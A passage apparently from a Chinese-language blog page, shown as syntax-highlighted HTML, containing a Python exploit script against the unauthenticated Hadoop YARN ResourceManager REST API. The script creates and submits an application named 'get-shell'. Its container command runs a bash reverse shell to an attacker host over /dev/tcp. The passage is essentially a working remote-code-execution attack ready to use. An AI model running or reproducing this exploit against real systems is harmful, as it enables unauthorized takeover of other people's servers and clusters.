class="hljs-comment"># 攻击机</span><br>port = <span class="hljs-string">'8999'</span>  <span class="hljs-comment"># 监听shell端口</span><br><span class="hljs-comment"># -------------------------------------------------------------------------------------------------------</span><br>url = target + <span class="hljs-string">'ws/v1/cluster/apps/new-application'</span><br>resp = requests.post(url)<br>app_id = resp.json()[<span class="hljs-string">'application-id'</span>]<br>url = target + <span class="hljs-string">'ws/v1/cluster/apps'</span><br>data = {<br>    <span class="hljs-string">'application-id'</span>: app_id,<br>    <span class="hljs-string">'application-name'</span>: <span class="hljs-string">'get-shell'</span>,<br>    <span class="hljs-string">'am-container-spec'</span>: {<br>        <span class="hljs-string">'commands'</span>: {<br>            <span class="hljs-string">f'command'</span>: <span class="hljs-string">f'/bin/bash -i &gt;&amp; /dev/tcp/<span class="hljs-subst">{lhost}</span>/<span class="hljs-subst">{port}</span> 0&gt;&amp;1'</span>,<br>        },<br>    },<br>    <span class="hljs-string">'application-type'</span>: <span class="hljs-string">'YARN'</span>,<br>}<br>requests.post(url, json=data)<br></code></pre></td></tr></table></figure>
-
 </blockquote>
 
                 
